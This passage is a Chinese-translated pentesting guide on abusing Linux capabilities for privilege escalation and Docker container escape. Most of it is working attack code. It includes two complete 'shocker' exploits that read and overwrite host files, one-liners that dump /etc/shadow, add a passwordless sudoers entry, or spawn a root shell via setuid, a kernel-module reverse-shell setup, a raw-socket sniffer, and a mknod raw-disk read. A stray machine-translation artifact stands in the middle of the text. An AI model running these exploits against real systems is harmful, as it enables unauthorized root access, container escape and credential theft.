```
```markdown
{% endcode %}

{% code title="Makefile" %}
```
```bash
obj-m +=reverse-shell.o

all:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```
{% endcode %}

{% hint style="warning" %}
Makefile 中每个 make 单词前的空白字符**必须是制表符，而不是空格**！
{% endhint %}

执行 `make` 来编译它。
```
ake[1]: *** /lib/modules/5.10.0-kali7-amd64/build: No such file or directory.  Stop.

sudo apt update
sudo apt full-upgrade
```
最后，在一个shell中启动`nc`，并且从另一个shell中**加载模块**，你将在nc进程中捕获到shell：
```bash
#Shell 1
nc -lvnp 4444

#Shell 2
insmod reverse-shell.ko #Launch the reverse shell
```
**此技术的代码摘自“滥用 SYS_MODULE 能力”实验室，来自** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com)

此技术的另一个例子可以在 [https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host](https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host) 找到

## CAP_DAC_READ_SEARCH

[**CAP_DAC_READ_SEARCH**](https://man7.org/linux/man-pages/man7/capabilities.7.html) 允许进程**绕过文件读取，以及目录读取和执行权限**。虽然这是为了搜索或读取文件而设计的，但它也授予进程权限调用 `open_by_handle_at(2)`。任何具有 `CAP_DAC_READ_SEARCH` 能力的进程都可以使用 `open_by_handle_at(2)` 访问任何文件，即使是那些位于其挂载命名空间之外的文件。传递给 `open_by_handle_at(2)` 的句柄本意是作为一个使用 `name_to_handle_at(2)` 检索到的不透明标识符。然而，这个句柄包含敏感且可篡改的信息，如 inode 编号。这最初是由 Sebastian Krahmer 通过 [shocker](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3) 漏洞展示的问题。
**这意味着你可以** **绕过文件读取权限检查以及目录读取/执行权限检查。**

**带二进制文件的示例**

二进制文件将能够读取任何文件。因此，如果像 tar 这样的文件具有这种能力，它将能够读取 shadow 文件：
```bash
cd /etc
tar -czf /tmp/shadow.tar.gz shadow #Compress show file in /tmp
cd /tmp
tar -cxf shadow.tar.gz
```
**示例 binary2**

在这个例子中，假设 **`python`** 二进制文件具有这种能力。为了列出 root 文件，你可以执行：
```python
import os
for r, d, f in os.walk('/root'):
for filename in f:
print(filename)
```
```markdown
而要读取文件，你可以执行：
```
```python
print(open("/etc/shadow", "r").read())
```
**环境示例（Docker breakout）**

您可以使用以下命令检查 Docker 容器内启用的 capabilities：
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
在前面的输出中，您可以看到 **DAC\_READ\_SEARCH** 能力被启用。因此，容器可以**调试进程**。

您可以在 [https://medium.com/@fun\_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3](https://medium.com/@fun\_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3) 学习以下利用方法的工作原理，但总结来说，**CAP\_DAC\_READ\_SEARCH** 不仅允许我们在没有权限检查的情况下遍历文件系统，而且还明确地移除了对 _**open\_by\_handle\_at(2)**_ 的任何检查，并且**可能允许我们的进程打开其他进程打开的敏感文件**。

原始利用这些权限从宿主机读取文件的漏洞可以在这里找到：[http://stealth.openwall.net/xSports/shocker.c](http://stealth.openwall.net/xSports/shocker.c)，以下是一个**修改过的版本，允许您指示您想要读取的文件作为第一个参数，并将其转储到一个文件中。**
```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker.c -o shocker
// ./socker /etc/shadow shadow #Read /etc/shadow from host and save result in shadow file in current dir

struct my_file_handle {
unsigned int handle_bytes;
int handle_type;
unsigned char f_handle[8];
};

void die(const char *msg)
{
perror(msg);
exit(errno);
}

void dump_handle(const struct my_file_handle *h)
{
fprintf(stderr,"[*] #=%d, %d, char nh[] = {", h->handle_bytes,
h->handle_type);
for (int i = 0; i < h->handle_bytes; ++i) {
fprintf(stderr,"0x%02x", h->f_handle[i]);
if ((i + 1) % 20 == 0)
fprintf(stderr,"\n");
if (i < h->handle_bytes - 1)
fprintf(stderr,", ");
}
fprintf(stderr,"};\n");
}

int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle
*oh)
{
int fd;
uint32_t ino = 0;
struct my_file_handle outh = {
.handle_bytes = 8,
.handle_type = 1
};
DIR *dir = NULL;
struct dirent *de = NULL;
path = strchr(path, '/');
// recursion stops if path has been resolved
if (!path) {
memcpy(oh->f_handle, ih->f_handle, sizeof(oh->f_handle));
oh->handle_type = 1;
oh->handle_bytes = 8;
return 1;
}

++path;
fprintf(stderr, "[*] Resolving '%s'\n", path);
if ((fd = open_by_handle_at(bfd, (struct file_handle *)ih, O_RDONLY)) < 0)
die("[-] open_by_handle_at");
if ((dir = fdopendir(fd)) == NULL)
die("[-] fdopendir");
for (;;) {
de = readdir(dir);
if (!de)
break;
fprintf(stderr, "[*] Found %s\n", de->d_name);
if (strncmp(de->d_name, path, strlen(de->d_name)) == 0) {
fprintf(stderr, "[+] Match: %s ino=%d\n", de->d_name, (int)de->d_ino);
ino = de->d_ino;
break;
}
}

fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
if (de) {
for (uint32_t i = 0; i < 0xffffffff; ++i) {
outh.handle_bytes = 8;
outh.handle_type = 1;
memcpy(outh.f_handle, &ino, sizeof(ino));
memcpy(outh.f_handle + 4, &i, sizeof(i));
if ((i % (1<<20)) == 0)
fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de->d_name, i);
if (open_by_handle_at(bfd, (struct file_handle *)&outh, 0) > 0) {
closedir(dir);
close(fd);
dump_handle(&outh);
return find_handle(bfd, path, &outh, oh);
}
}
}
closedir(dir);
close(fd);
return 0;
}


int main(int argc,char* argv[] )
{
char buf[0x1000];
int fd1, fd2;
struct my_file_handle h;
struct my_file_handle root_h = {
.handle_bytes = 8,
.handle_type = 1,
.f_handle = {0x02, 0, 0, 0, 0, 0, 0, 0}
};

fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
"[***] The tea from the 90's kicks your sekurity again. [***]\n"
"[***] If you have pending sec consulting, I'll happily [***]\n"
"[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");

read(0, buf, 1);

// get a FS reference from something mounted in from outside
if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
die("[-] open");

if (find_handle(fd1, argv[1], &root_h, &h) <= 0)
die("[-] Cannot find valid handle!");

fprintf(stderr, "[!] Got a final handle!\n");
dump_handle(&h);

if ((fd2 = open_by_handle_at(fd1, (struct file_handle *)&h, O_RDONLY)) < 0)
die("[-] open_by_handle");

memset(buf, 0, sizeof(buf));
if (read(fd2, buf, sizeof(buf) - 1) < 0)
die("[-] read");

printf("Success!!\n");

FILE *fptr;
fptr = fopen(argv[2], "w");
fprintf(fptr,"%s", buf);
fclose(fptr);

close(fd2); close(fd1);

return 0;
}
```
{% hint style="warning" %}
利用需要找到一个指向主机上已挂载内容的指针。原始利用使用的是文件 /.dockerinit，而这个修改版本使用的是 /etc/hostname。如果利用不起作用，可能需要设置不同的文件。要找到一个在主机上已挂载的文件，只需执行 mount 命令：
{% endhint %}

![](<../../.gitbook/assets/image (407) (1).png>)

**此技术的代码是从 "Abusing DAC\_READ\_SEARCH Capability" 实验室复制的，来源于** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com)

​

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

​​​​​​​​​​​[**RootedCON**](https://www.rootedcon.com/) 是**西班牙**最重要的网络安全活动，也是**欧洲**最重要的活动之一。以**推广技术知识**为使命，这个大会是技术和网络安全专业人士在各个学科的沸腾交汇点。

{% embed url="https://www.rootedcon.com/" %}

## CAP\_DAC\_OVERRIDE

**这意味着你可以绕过对任何文件的写权限检查，因此你可以写任何文件。**

有很多文件你可以**覆盖以提升权限，**[**你可以从这里获取灵感**](payloads-to-execute.md#overwriting-a-file-to-escalate-privileges)。

**示例与二进制**

在此示例中，vim 具有此能力，因此你可以修改任何文件，如 _passwd_、_sudoers_ 或 _shadow_：
```bash
getcap -r / 2>/dev/null
/usr/bin/vim = cap_dac_override+ep

vim /etc/sudoers #To overwrite it
```
**示例二**

在此示例中，**`python`** 二进制文件将具有此能力。您可以使用 python 覆盖任何文件：
```python
file=open("/etc/sudoers","a")
file.write("yourusername ALL=(ALL) NOPASSWD:ALL")
file.close()
```
**示例：环境 + CAP\_DAC\_READ\_SEARCH（Docker breakout）**

您可以使用以下命令检查 Docker 容器内启用的 capabilities：
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
首先阅读前一节关于[**滥用 DAC\_READ\_SEARCH 能力来读取主机的任意文件**](linux-capabilities.md#cap\_dac\_read\_search)并**编译**漏洞利用程序。\
然后，**编译以下版本的 shocker 漏洞利用程序**，它将允许你在主机文件系统中**写入任意文件**：
```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker_write.c -o shocker_write
// ./shocker_write /etc/passwd passwd

struct my_file_handle {
unsigned int handle_bytes;
int handle_type;
unsigned char f_handle[8];
};
void die(const char * msg) {
perror(msg);
exit(errno);
}
void dump_handle(const struct my_file_handle * h) {
fprintf(stderr, "[*] #=%d, %d, char nh[] = {", h -> handle_bytes,
h -> handle_type);
for (int i = 0; i < h -> handle_bytes; ++i) {
fprintf(stderr, "0x%02x", h -> f_handle[i]);
if ((i + 1) % 20 == 0)
fprintf(stderr, "\n");
if (i < h -> handle_bytes - 1)
fprintf(stderr, ", ");
}
fprintf(stderr, "};\n");
}
int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle *oh)
{
int fd;
uint32_t ino = 0;
struct my_file_handle outh = {
.handle_bytes = 8,
.handle_type = 1
};
DIR * dir = NULL;
struct dirent * de = NULL;
path = strchr(path, '/');
// recursion stops if path has been resolved
if (!path) {
memcpy(oh -> f_handle, ih -> f_handle, sizeof(oh -> f_handle));
oh -> handle_type = 1;
oh -> handle_bytes = 8;
return 1;
}
++path;
fprintf(stderr, "[*] Resolving '%s'\n", path);
if ((fd = open_by_handle_at(bfd, (struct file_handle * ) ih, O_RDONLY)) < 0)
die("[-] open_by_handle_at");
if ((dir = fdopendir(fd)) == NULL)
die("[-] fdopendir");
for (;;) {
de = readdir(dir);
if (!de)
break;
fprintf(stderr, "[*] Found %s\n", de -> d_name);
if (strncmp(de -> d_name, path, strlen(de -> d_name)) == 0) {
fprintf(stderr, "[+] Match: %s ino=%d\n", de -> d_name, (int) de -> d_ino);
ino = de -> d_ino;
break;
}
}
fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
if (de) {
for (uint32_t i = 0; i < 0xffffffff; ++i) {
outh.handle_bytes = 8;
outh.handle_type = 1;
memcpy(outh.f_handle, & ino, sizeof(ino));
memcpy(outh.f_handle + 4, & i, sizeof(i));
if ((i % (1 << 20)) == 0)
fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de -> d_name, i);
if (open_by_handle_at(bfd, (struct file_handle * ) & outh, 0) > 0) {
closedir(dir);
close(fd);
dump_handle( & outh);
return find_handle(bfd, path, & outh, oh);
}
}
}
closedir(dir);
close(fd);
return 0;
}
int main(int argc, char * argv[]) {
char buf[0x1000];
int fd1, fd2;
struct my_file_handle h;
struct my_file_handle root_h = {
.handle_bytes = 8,
.handle_type = 1,
.f_handle = {
0x02,
0,
0,
0,
0,
0,
0,
0
}
};
fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
"[***] The tea from the 90's kicks your sekurity again. [***]\n"
"[***] If you have pending sec consulting, I'll happily [***]\n"
"[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");
read(0, buf, 1);
// get a FS reference from something mounted in from outside
if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
die("[-] open");
if (find_handle(fd1, argv[1], & root_h, & h) <= 0)
die("[-] Cannot find valid handle!");
fprintf(stderr, "[!] Got a final handle!\n");
dump_handle( & h);
if ((fd2 = open_by_handle_at(fd1, (struct file_handle * ) & h, O_RDWR)) < 0)
die("[-] open_by_handle");
char * line = NULL;
size_t len = 0;
FILE * fptr;
ssize_t read;
fptr = fopen(argv[2], "r");
while ((read = getline( & line, & len, fptr)) != -1) {
write(fd2, line, read);
}
printf("Success!!\n");
close(fd2);
close(fd1);
return 0;
}
```
为了逃离docker容器，你可以**下载**主机上的文件`/etc/shadow`和`/etc/passwd`，向它们**添加**一个**新用户**，并使用**`shocker_write`**来覆盖它们。然后，通过**ssh**进行**访问**。

**此技术的代码复制自"Abusing DAC\_OVERRIDE Capability"实验室，来源于** [**https://www.pentesteracademy.com**](https://www.pentesteracademy.com)

## CAP\_CHOWN

**这意味着可以更改任何文件的所有权。**

**带二进制文件的示例**

假设**`python`**二进制文件具有此能力，你可以**更改** **shadow**文件的**所有者**，**更改root密码**，并提升权限：
```bash
python -c 'import os;os.chown("/etc/shadow",1000,1000)'
```
或者使用具有此功能的**`ruby`**二进制文件：
```bash
ruby -e 'require "fileutils"; FileUtils.chown(1000, 1000, "/etc/shadow")'
```
## CAP\_FOWNER

**这意味着可以更改任何文件的权限。**

**二进制示例**

如果python具有此能力，您可以修改shadow文件的权限，**更改root密码**，并提升权限：
```bash
python -c 'import os;os.chmod("/etc/shadow",0666)
```
### CAP\_SETUID

**这意味着可以设置创建进程的有效用户ID。**

**二进制示例**

如果python具有这项**能力**，你可以非常容易地滥用它来提升权限至root：
```python
import os
os.setuid(0)
os.system("/bin/bash")
```
**另一种方式：**
```python
import os
import prctl
#add the capability to the effective set
prctl.cap_effective.setuid = True
os.setuid(0)
os.system("/bin/bash")
```
## CAP\_SETGID

**这意味着可以设置创建进程的有效组ID。**

有很多文件你可以**覆盖以提升权限，** [**你可以从这里获取灵感**](payloads-to-execute.md#overwriting-a-file-to-escalate-privileges)。

**使用二进制文件的例子**

在这种情况下，你应该寻找一个组可以读取的有趣文件，因为你可以冒充任何组：
```bash
#Find every file writable by a group
find / -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file writable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file readable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=r -exec ls -lLd {} \; 2>/dev/null
```
一旦你找到了一个可以滥用（通过读取或写入）来提升权限的文件，你可以通过以下方式**获取一个模拟有趣用户组的 shell**：
```python
import os
os.setgid(42)
os.system("/bin/bash")
```
在这种情况下，模拟了shadow组，因此您可以读取文件`/etc/shadow`：
```bash
cat /etc/shadow
```
如果安装了**docker**，你可以**冒充** **docker组**并滥用它与[**docker套接字**通信并提升权限](./#writable-docker-socket)。

## CAP\_SETFCAP

**这意味着可以在文件和进程上设置能力**

**二进制示例**

如果python具有这个**能力**，你可以很容易地滥用它来提升权限到root：

{% code title="setcapability.py" %}
```python
import ctypes, sys

#Load needed library
#You can find which library you need to load checking the libraries of local setcap binary
# ldd /sbin/setcap
libcap = ctypes.cdll.LoadLibrary("libcap.so.2")

libcap.cap_from_text.argtypes = [ctypes.c_char_p]
libcap.cap_from_text.restype = ctypes.c_void_p
libcap.cap_set_file.argtypes = [ctypes.c_char_p,ctypes.c_void_p]

#Give setuid cap to the binary
cap = 'cap_setuid+ep'
path = sys.argv[1]
print(path)
cap_t = libcap.cap_from_text(cap)
status = libcap.cap_set_file(path,cap_t)

if(status == 0):
print (cap + " was successfully added to " + path)
```
Since there is no content provided before the `{% endcode %}` tag, there is nothing to translate. Please provide the relevant English text that needs to be translated into Chinese.
```bash
python setcapability.py /usr/bin/python2.7
```
{% hint style="warning" %}
请注意，如果您使用CAP\_SETFCAP为二进制文件设置了新的能力，您将失去这个能力。
{% endhint %}

一旦您获得了[SETUID能力](linux-capabilities.md#cap\_setuid)，您可以转到其部分查看如何提升权限。

**带环境的示例（Docker breakout）**

默认情况下，**CAP\_SETFCAP能力被赋予Docker容器内的进程**。您可以通过以下操作来检查：
```bash
cat /proc/`pidof bash`/status | grep Cap
CapInh: 00000000a80425fb
CapPrm: 00000000a80425fb
CapEff: 00000000a80425fb
CapBnd: 00000000a80425fb
CapAmb: 0000000000000000

capsh --decode=00000000a80425fb
0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
```
此能力允许**向二进制文件授予任何其他能力**，因此我们可以考虑通过**滥用本页提到的其他能力突破**来**逃离**容器。\
然而，如果你尝试比如将 CAP\_SYS\_ADMIN 和 CAP\_SYS\_PTRACE 能力授予 gdb 二进制文件，你会发现你可以授予它们，但是**此后二进制文件将无法执行**：
```bash
getcap /usr/bin/gdb
/usr/bin/gdb = cap_sys_ptrace,cap_sys_admin+eip

setcap cap_sys_admin,cap_sys_ptrace+eip /usr/bin/gdb

/usr/bin/gdb
bash: /usr/bin/gdb: Operation not permitted
```
在调查后，我读到这样一段：_Permitted: 这是线程可能假设的有效能力的**限制性超集**。它也是可以被线程添加到可继承集的能力的限制性超集，前提是该线程在其有效集中**没有CAP\_SETPCAP**能力。_\
看起来Permitted能力限制了可以使用的能力。\
然而，Docker默认也授予了**CAP\_SETPCAP**，所以你可能能够**在可继承的能力中设置新的能力**。\
然而，在这个能力的文档中：_CAP\_SETPCAP : \[…] **从调用线程的边界集添加任何能力到其可继承集**。_\
看起来我们只能从边界集中添加能力到可继承集。这意味着**我们不能将像CAP\_SYS\_ADMIN或CAP\_SYS\_PTRACE这样的新能力放入继承集中来提升权限**。

## CAP\_SYS\_RAWIO

[**CAP\_SYS\_RAWIO**](https://man7.org/linux/man-pages/man7/capabilities.7.html) 提供了许多敏感操作，包括访问 `/dev/mem`、`/dev/kmem` 或 `/proc/kcore`，修改 `mmap_min_addr`，访问 `ioperm(2)` 和 `iopl(2)` 系统调用，以及各种磁盘命令。通过这个能力，`FIBMAP ioctl(2)` 也被启用，这在[过去](http://lkml.iu.edu/hypermail/linux/kernel/9907.0/0132.html)曾引起问题。根据手册页，这还允许持有者描述性地`对其他设备执行一系列设备特定操作`。

这对于**权限提升**和**Docker breakout**很有用。

## CAP\_KILL

**这意味着它可以杀死任何进程。**

**带二进制的示例**

假设**`python`** 二进制文件具有这个能力。如果你还能**修改某些服务或套接字配置**（或任何与服务相关的配置文件），你可以对其进行后门处理，然后杀死与该服务相关的进程，并等待新的配置文件执行你的后门。
```python
#Use this python code to kill arbitrary processes
import os
import signal
pgid = os.getpgid(341)
os.killpg(pgid, signal.SIGKILL)
```
**提权与kill**

如果你拥有kill能力，并且有一个**以root身份运行的node程序**（或作为不同用户），你可能可以向它**发送SIGUSR1信号**，使其**打开node调试器**，以便你可以连接。
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
{% content-ref url="electron-cef-chromium-debugger-abuse.md" %}
[electron-cef-chromium-debugger-abuse.md](electron-cef-chromium-debugger-abuse.md)
{% endcontent-ref %}

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

[**RootedCON**](https://www.rootedcon.com/) 是**西班牙**最重要的网络安全活动，也是**欧洲**最重要的活动之一。这个大会的**使命是促进技术知识的传播**，是技术和网络安全专业人士在各个领域的交流热点。

{% embed url="https://www.rootedcon.com/" %}

## CAP\_NET\_BIND\_SERVICE

**这意味着可以监听任何端口（包括特权端口）。** 你不能直接通过这个能力提升权限。

**二进制示例**

如果 **`python`** 拥有这个能力，它将能够监听任何端口，甚至可以从该端口连接到任何其他端口（一些服务要求从特定特权端口进行连接）

{% tabs %}
{% tab title="监听" %}
```python
import socket
s=socket.socket()
s.bind(('0.0.0.0', 80))
s.listen(1)
conn, addr = s.accept()
while True:
output = connection.recv(1024).strip();
print(output)
```
{% endtab %}

{% tab title="连接" %}
```python
import socket
s=socket.socket()
s.bind(('0.0.0.0',500))
s.connect(('10.10.10.10',500))
```
{% endtab %}
{% endtabs %}

## CAP\_NET\_RAW

[**CAP\_NET\_RAW**](https://man7.org/linux/man-pages/man7/capabilities.7.html) 允许进程能够为可用的网络命名空间**创建 RAW 和 PACKET 套接字类型**。这允许通过暴露的网络接口生成和传输任意数据包。在许多情况下，这个接口将是一个虚拟以太网设备，这可能允许恶意或**被攻破的容器**在各种网络层**伪造** **数据包**。拥有此能力的恶意进程或被攻破的容器可能会注入到上游桥接中，利用容器间的路由，绕过网络访问控制，并在没有防火墙限制数据包类型和内容的情况下干扰主机网络。最后，这个能力允许进程绑定到可用命名空间内的任何地址。这个能力通常由特权容器保留，以允许 ping 通过使用 RAW 套接字从容器创建 ICMP 请求来工作。

**这意味着有可能嗅探流量。** 你不能直接通过这个能力提升权限。

**带二进制文件的示例**

如果二进制文件 **`tcpdump`** 拥有这个能力，你将能够使用它来捕获网络信息。
```bash
getcap -r / 2>/dev/null
/usr/sbin/tcpdump = cap_net_raw+ep
```
请注意，如果**环境**提供了这个能力，您也可以使用 **`tcpdump`** 来嗅探流量。

**二进制示例 2**

以下示例是可以用来拦截“**lo**”（**localhost**）接口流量的 **`python2`** 代码。该代码来自 [https://attackdefense.pentesteracademy.com/](https://attackdefense.pentesteracademy.com) 上的实验室“基础知识：CAP-NET_BIND + NET_RAW”。
```python
import socket
import struct

flags=["NS","CWR","ECE","URG","ACK","PSH","RST","SYN","FIN"]

def getFlag(flag_value):
flag=""
for i in xrange(8,-1,-1):
if( flag_value & 1 <<i ):
flag= flag + flags[8-i] + ","
return flag[:-1]

s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 2**30)
s.bind(("lo",0x0003))

flag=""
count=0
while True:
frame=s.recv(4096)
ip_header=struct.unpack("!BBHHHBBH4s4s",frame[14:34])
proto=ip_header[6]
ip_header_size = (ip_header[0] & 0b1111) * 4
if(proto==6):
protocol="TCP"
tcp_header_packed = frame[ 14 + ip_header_size : 34 + ip_header_size]
tcp_header = struct.unpack("!HHLLHHHH", tcp_header_packed)
dst_port=tcp_header[0]
src_port=tcp_header[1]
flag=" FLAGS: "+getFlag(tcp_header[4])

elif(proto==17):
protocol="UDP"
udp_header_packed_ports = frame[ 14 + ip_header_size : 18 + ip_header_size]
udp_header_ports=struct.unpack("!HH",udp_header_packed_ports)
dst_port=udp_header[0]
src_port=udp_header[1]

if (proto == 17 or proto == 6):
print("Packet: " + str(count) + " Protocol: " + protocol + " Destination Port: " + str(dst_port) + " Source Port: " + str(src_port) + flag)
count=count+1
```
## CAP\_NET\_ADMIN + CAP\_NET\_RAW

[**CAP\_NET\_ADMIN**](https://man7.org/linux/man-pages/man7/capabilities.7.html) 允许持有者**修改暴露的网络命名空间的防火墙、路由表、套接字权限**，以及暴露的网络接口上的网络接口配置和其他相关设置。这还提供了为附加的网络接口**启用混杂模式**的能力，并有可能跨命名空间嗅探。

**示例与二进制**

假设 **python 二进制文件** 具有这些能力。
```python
#Dump iptables filter table rules
import iptc
import pprint
json=iptc.easy.dump_table('filter',ipv6=False)
pprint.pprint(json)

#Flush iptables filter table
import iptc
iptc.easy.flush_table('filter')
```
## CAP\_LINUX\_IMMUTABLE

**这意味着可以修改inode属性。** 你不能直接通过这个能力提升权限。

**二进制示例**

如果你发现一个文件是不可变的，并且python具有这个能力，你可以**移除不可变属性，使文件可修改：**
```python
#Check that the file is imutable
lsattr file.sh
----i---------e--- backup.sh
```

```python
#Pyhton code to allow modifications to the file
import fcntl
import os
import struct

FS_APPEND_FL = 0x00000020
FS_IOC_SETFLAGS = 0x40086602

fd = os.open('/path/to/file.sh', os.O_RDONLY)
f = struct.pack('i', FS_APPEND_FL)
fcntl.ioctl(fd, FS_IOC_SETFLAGS, f)

f=open("/path/to/file.sh",'a+')
f.write('New content for the file\n')
```
{% hint style="info" %}
请注意，通常使用以下命令设置和删除此不可变属性：
```bash
sudo chattr +i file.txt
sudo chattr -i file.txt
```
{% endhint %}

## CAP\_SYS\_CHROOT

[**CAP\_SYS\_CHROOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) 允许使用 `chroot(2)` 系统调用。这可能允许逃离任何 `chroot(2)` 环境，利用已知的弱点和逃逸方法：

* [如何从各种 chroot 解决方案中逃脱](https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf)
* [chw00t: chroot 逃逸工具](https://github.com/earthquake/chw00t/)

## CAP\_SYS\_BOOT

[**CAP\_SYS\_BOOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) 允许使用 `reboot(2)` 系统调用。它还允许通过 `LINUX_REBOOT_CMD_RESTART2` 执行任意 **重启命令**，为一些特定硬件平台实现。

这个能力还允许使用 `kexec_load(2)` 系统调用，它加载新的崩溃内核，以及从 Linux 3.17 开始的 `kexec_file_load(2)`，它还将加载签名内核。

## CAP\_SYSLOG

[CAP\_SYSLOG](https://man7.org/linux/man-pages/man7/capabilities.7.html) 最终在 Linux 2.6.37 中从 `CAP_SYS_ADMIN` 通用能力中分离出来，这个能力允许进程使用 `syslog(2)` 系统调用。这也允许进程查看通过 `/proc` 和其他接口暴露的内核地址，当 `/proc/sys/kernel/kptr_restrict` 设置为 1 时。

`kptr_restrict` sysctl 设置在 2.6.38 中引入，用于确定是否暴露内核地址。自 2.6.39 起，默认值为零（暴露内核地址），尽管许多发行版正确地将值设置为 1（对所有人隐藏，除了 uid 0）或 2（始终隐藏）。

此外，这个能力还允许进程查看 `dmesg` 输出，如果 `dmesg_restrict` 设置为 1。最后，出于历史原因，`CAP_SYS_ADMIN` 能力仍然被允许执行 `syslog` 操作。

## CAP\_MKNOD

[CAP\_MKNOD](https://man7.org/linux/man-pages/man7/capabilities.7.html) 通过允许创建除了常规文件（`S_IFREG`）、FIFO（命名管道）（`S_IFIFO`）或 UNIX 域套接字（`S_IFSOCK`）之外的东西，扩展了 [mknod](https://man7.org/linux/man-pages/man2/mknod.2.html) 的使用。特殊文件包括：

* `S_IFCHR`（字符特殊文件（像终端这样的设备））
* `S_IFBLK`（块特殊文件（像磁盘这样的设备））。

它是一个默认能力（[https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19](https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19)）。

这个能力允许在主机上进行权限提升（通过完整磁盘读取），在以下条件下：

1. 对主机有初始访问权限（非特权）。
2. 对容器有初始访问权限（特权（EUID 0），并且有效的 `CAP_MKNOD`）。
3. 主机和容器应共享相同的用户命名空间。

**步骤：**

1. 在主机上，作为标准用户：
   1. 获取当前 UID（`id`）。例如：`uid=1000(unprivileged)`。
   2. 获取你想要读取的设备。例如：`/dev/sda`
2. 在容器中，作为 `root`：
```bash
# Create a new block special file matching the host device
mknod /dev/sda b
# Configure the permissions
chmod ug+w /dev/sda
# Create the same standard user than the one on host
useradd -u 1000 unprivileged
# Login with that user
su unprivileged
```
1. 回到主机上：
```bash
# Find the PID linked to the container owns by the user "unprivileged"
# Example only (Depends on the shell program, etc.). Here: PID=18802.
$ ps aux | grep -i /bin/sh | grep -i unprivileged
unprivileged        18802  0.0  0.0   1712     4 pts/0    S+   15:27   0:00 /bin/sh
```

```bash
# Because of user namespace sharing, the unprivileged user have access to the container filesystem, and so the created block special file pointing on /dev/sda
head /proc/18802/root/dev/sda
```
攻击者现在可以从非特权用户读取、转储、复制设备 `/dev/sda`。

### CAP\_SETPCAP

